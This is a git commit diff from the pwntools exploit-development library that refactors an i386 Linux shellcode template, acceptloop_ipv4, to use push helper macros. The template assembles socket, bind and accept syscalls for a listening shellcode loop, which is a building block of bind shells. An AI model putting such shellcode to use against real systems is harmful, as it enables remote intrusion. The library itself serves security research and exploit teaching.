2aeda2c993b749a2c5c13ed37ec3f2259bb9dc77
MengHuan Yu <cebrusfs@gmail.com>
2015-03-26 00:55:27 +0800

    Use PUSH template in acceptloop_ipv4
    BUG=None
    TEST=confirmed the behavior by strace.

--- pwnlib/shellcraft/templates/i386/linux/acceptloop_ipv4.asm
+++ pwnlib/shellcraft/templates/i386/linux/acceptloop_ipv4.asm
@@ -19,23 +19,22 @@ ${acceptloop}:
         /*  Socket file descriptor is placed in EBP */
 
         /*  sock = socket(AF_INET, SOCK_STREAM, 0) */
-        xor edx, edx
-        push edx                            /*  IPPROTO_IP (= 0) */
-        push SYS_socketcall_socket          /*  SOCK_STREAM */
-        push AF_INET
+        ${i386.linux.push(0)}
+        ${i386.linux.push('SOCK_STREAM')}
+        ${i386.linux.push('AF_INET')}
         ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_socket', 'esp')}
 
         ${i386.linux.mov('esi', 'eax')}      /* keep socket fd */
 
         /*  bind(sock, &addr, sizeof addr); // sizeof addr == 0x10 */
-        push edx
+        ${i386.linux.push(0)}
         /* ${htons(port)} == htons(${port}) */
         ${i386.linux.push('AF_INET | (%d << 16)' % htons(port))}
         ${i386.linux.mov('ecx', 'esp')}
-        push 0x10               /* sizeof addr */
-        push ecx                /* &addr */
-        push eax                /* sock */
-        ${i386.linux.mov('ecx', 'esp')}
+
+        ${i386.linux.push(0x10)}    /* sizeof addr */
+        ${i386.linux.push('ecx')}   /* &addr */
+        ${i386.linux.push('eax')}   /* sock */
         ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_bind', 'esp')}
 
         /*  listen(sock, whatever) */
@@ -44,8 +43,8 @@ ${acceptloop}:
 
 ${looplabel}:
         /*  accept(sock, NULL, NULL) */
-        push edx
-        push esi                /*  sock */
+        ${i386.linux.push(0x0)}
+        ${i386.linux.push('esi')} /* sock */
         ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_accept', 'esp')}
 
         ${i386.linux.mov('ebp', 'eax')}      /* keep in-comming socket fd */
